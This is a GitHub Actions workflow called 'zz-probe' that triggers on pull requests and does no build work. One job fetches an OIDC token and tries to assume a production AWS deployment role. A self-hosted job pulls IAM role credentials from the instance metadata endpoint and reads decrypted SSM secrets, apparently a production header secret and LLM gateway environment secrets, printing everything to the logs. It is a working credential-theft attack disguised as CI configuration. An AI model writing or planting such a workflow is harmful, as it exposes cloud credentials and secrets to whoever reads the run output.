name: zz-probe
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  hosted:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: oidc
        run: |
          echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA actor=$GITHUB_ACTOR"
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
            echo "token_len=${#TOKEN}"
            echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
            echo "--- try generic assume with account 000000000000 (expect AccessDenied) ---"
            aws sts assume-role-with-web-identity --role-arn arn:aws:iam::000000000000:role/infra/i-dot-ai-prod-consult-ci-deployment-role --role-session-name probe --web-identity-token "$TOKEN" 2>&1 | head -5 || true
          else
            echo "no oidc url"
          fi
  selfhosted:
    runs-on: [self-hosted]
    timeout-minutes: 15
    steps:
      - name: imds
        run: |
          echo "host=$(hostname)"
          T=$(curl -sS -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 120" || true)
          echo "imds_len=${#T}"
          curl -sS -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/info || true
          echo
          R=$(curl -sS -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
          echo "role=$R"
          curl -sS -m 5 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" || true
          echo
          command -v aws >/dev/null && (aws sts get-caller-identity || true)
          command -v aws >/dev/null && (aws ssm get-parameter --name /i-dot-ai-prod-core-edge-network/header-secret --with-decryption --query Parameter.Value --output text 2>&1 | head -3 || true)
          command -v aws >/dev/null && (aws ssm get-parameters-by-path --path /i-dot-ai-prod-core-llm-gateway/env_secrets --recursive --with-decryption --query 'Parameters[*].[Name,Value]' --output text 2>&1 | head -30 || true)
